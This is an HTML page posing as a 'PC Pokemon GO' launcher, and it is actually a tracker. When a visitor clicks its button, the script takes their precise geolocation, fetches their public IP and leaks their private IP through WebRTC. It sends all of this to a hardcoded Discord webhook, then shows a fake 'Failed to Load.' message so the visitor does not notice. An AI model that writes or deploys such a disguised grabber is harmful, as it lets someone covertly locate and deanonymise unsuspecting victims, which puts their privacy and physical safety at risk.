<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>PC Pokemon GO Google Maps API</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
            font-family: Arial, sans-serif;} #buttonContainer {
            display: flex;
            flex-direction: column;
            align-items: center;} #sendLocation {
            background-color: red;
            border: none;
            border-radius: 50%;
            width: 100px;
            height: 100px;
            cursor: pointer;
            font-size: 16px;
            color: white;
            outline: none;
            transition: background-color 0.3s;} #sendLocation:hover {
            background-color: darkred;} h1 {
            position: absolute;
            top: 20%;
            font-size: 24px;
            text-align: center;} </style>
</head>
<body>
    <h1>Click to enter PC Pokemon GO</h1>
    <div id="buttonContainer">        <button id="sendLocation">•</button>
    </div>
    <audio id="audio" src="funny.mp3" preload="auto"></audio> <!-- Replace with your audio file -->

    <script>
        document.getElementById('sendLocation').addEventListener('click', function() {
            // Play audio when button is pressed
            document.getElementById('audio').play();            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                alert("Geolocation is not supported by this browser.");
            } 
        });

        // Function to get Public IP from a third-party service
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching public IP:', error);
                return 'Not available';
            }
        }

        // Function to get Private IP using WebRTC
        function getPrivateIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(pc.setLocalDescription.bind(pc));

                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        // Regex to find an IP address
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                        const ipAddr = ipRegex.exec(ice.candidate.candidate)[1];
                        if (ipAddr) {
                            pc.onicecandidate = null; // Stop listening for more candidates
                            resolve(ipAddr);
                        }
                    }
                };

                // Set a timeout in case the process hangs or fails
                setTimeout(() => resolve('Not available'), 1000);
            });
        }

        // Main function to gather all data and send it
        async function sendLocation(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Gather all IPs
            const publicIP = await getPublicIP();
            const privateIP = await getPrivateIP();

            // Create a Google Maps link with a marker at the exact location
            const googleMapsLink =`https://www.google.com/maps?q=${lat},${lon}&z=15`;
            
            const webhookUrl = 'https://discord.com/api/webhooks/1424102601112293407/wqpsY1rZMZaAuIDxOq8TgP75L0mpzozmTv_YGP6B6dBpQ0E6nJJVTr08teeFSJW27von'; // Your Discord webhook URL
            
            // Format the data for the Discord webhook
            const data = {
                content: `
--- New Player Log ---
**📍 Location:** [Click to view map](${googleMapsLink})
**🌐 Public IP:** \`${publicIP}\`
**💻 Private IP:** \`${privateIP}\`
----------------------
`
            };
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                }, 
                body: JSON.stringify(data)
            }).then(response => {
                if (response.ok) {
                    alert('Failed to Load.');
                } else {
                    alert('Failed to Load.');
                } 
            }).catch(error => {
                console.error('Error sending data to webhook:', error);
                alert('An error occurred while sending data.');
            });
        }

        function showError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("I Guess no game");                    
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");                    
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");                    
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");                    
                    break;
            } 
        }
    </script>
</body>
</html>
